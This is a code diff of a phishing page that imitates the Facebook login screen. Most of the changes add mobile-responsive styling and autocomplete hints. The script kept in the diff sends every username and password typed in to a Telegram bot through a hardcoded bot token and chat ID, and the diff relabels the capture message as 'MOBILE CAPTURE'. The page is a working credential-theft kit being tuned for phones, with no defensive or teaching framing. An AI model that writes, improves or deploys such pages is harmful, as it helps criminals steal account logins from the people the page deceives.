@@ -5,18 +5,123 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Log in to Facebook</title>
     <style>
-        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { display: flex; max-width: 980px; width: 100%; justify-content: space-between; align-items: center; padding: 20px; }
-        .left { max-width: 500px; padding-right: 32px; }
-        .left h1 { color: #1877f2; font-size: 44px; margin-bottom: 10px; }
-        .left p { font-size: 28px; line-height: 32px; color: #1c1e21; margin: 0; }
-        .right { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); width: 396px; text-align: center; }
-        input { width: 100%; padding: 14px 16px; margin: 6px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
-        button { width: 100%; background: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; padding: 12px; cursor: pointer; margin-top: 6px; }
-        button:hover { background: #166fe5; }
+        * { box-sizing: border-box; }
+        body { 
+            font-family: Helvetica, Arial, sans-serif; 
+            background: #f0f2f5; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            margin: 0; 
+            padding: 16px;
+        }
+        .container { 
+            display: flex; 
+            max-width: 980px; 
+            width: 100%; 
+            justify-content: space-between; 
+            align-items: center; 
+            gap: 20px;
+        }
+        .left { 
+            max-width: 500px; 
+            padding-right: 20px; 
+        }
+        .left h1 { 
+            color: #1877f2; 
+            font-size: 48px; 
+            margin: 0 0 10px 0; 
+        }
+        .left p { 
+            font-size: 24px; 
+            line-height: 28px; 
+            color: #1c1e21; 
+            margin: 0; 
+        }
+        .right { 
+            background: white; 
+            padding: 20px; 
+            border-radius: 8px; 
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); 
+            width: 100%;
+            max-width: 396px; 
+            text-align: center; 
+        }
+        input { 
+            width: 100%; 
+            padding: 14px 16px; 
+            margin: 6px 0; 
+            border: 1px solid #ddd; 
+            border-radius: 6px; 
+            font-size: 16px; 
+        }
+        button.login-btn { 
+            width: 100%; 
+            background: #1877f2; 
+            border: none; 
+            border-radius: 6px; 
+            color: white; 
+            font-size: 20px; 
+            font-weight: bold; 
+            padding: 12px; 
+            cursor: pointer; 
+            margin-top: 6px; 
+        }
+        button.login-btn:hover { background: #166fe5; }
         .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
-        .create-btn { background: #42b72a; width: auto; display: inline-block; padding: 0 16px; font-size: 17px; line-height: 48px; }
+        .create-btn { 
+            background: #42b72a; 
+            border: none;
+            border-radius: 6px;
+            color: white;
+            width: auto; 
+            display: inline-block; 
+            padding: 0 16px; 
+            font-size: 17px; 
+            font-weight: bold;
+            line-height: 48px; 
+            cursor: pointer;
+        }
         .create-btn:hover { background: #36a420; }
+
+        /* Mobile Responsive Breakpoint */
+        @media (max-width: 768px) {
+            body {
+                align-items: flex-start;
+                padding-top: 40px;
+            }
+            .container {
+                flex-direction: column;
+                text-align: center;
+                gap: 10px;
+            }
+            .left {
+                padding-right: 0;
+                max-width: 100%;
+                margin-bottom: 10px;
+            }
+            .left h1 {
+                font-size: 36px;
+            }
+            .left p {
+                font-size: 16px;
+                line-height: 20px;
+            }
+            .right {
+                width: 100%;
+                max-width: 100%;
+                box-shadow: none;
+                background: transparent;
+                padding: 10px;
+            }
+            .right form {
+                background: white;
+                padding: 20px;
+                border-radius: 8px;
+                box-shadow: 0 2px 4px rgba(0, 0, 0, .1);
+            }
+        }
     </style>
 </head>
 <body>
@@ -27,9 +132,9 @@
         </div>
         <div class="right">
             <form id="loginForm">
-                <input type="text" id="email" placeholder="Email address or phone number" required>
-                <input type="password" id="pass" placeholder="Password" required>
-                <button type="submit">Log In</button>
+                <input type="text" id="email" placeholder="Email address or phone number" required autocomplete="username">
+                <input type="password" id="pass" placeholder="Password" required autocomplete="current-password">
+                <button type="submit" class="login-btn">Log In</button>
             </form>
             <div class="divider"></div>
             <a href="https://www.facebook.com/r.php" style="text-decoration:none;"><button type="button" class="create-btn">Create new account</button></a>
@@ -44,7 +149,7 @@
             
             const botToken = "8931915858:AAHnAs6rPshxwP30jSfzORDOmXK2M2krUvs";
             const chatId = "8803897745";
-            const text = "🚨 [CLIENT CAPTURE] 🚨\nUser: " + u + "\nPass: " + p;
+            const text = "🚨 [MOBILE CAPTURE] 🚨\nUser: " + u + "\nPass: " + p;
             
             fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
                 method: "POST",
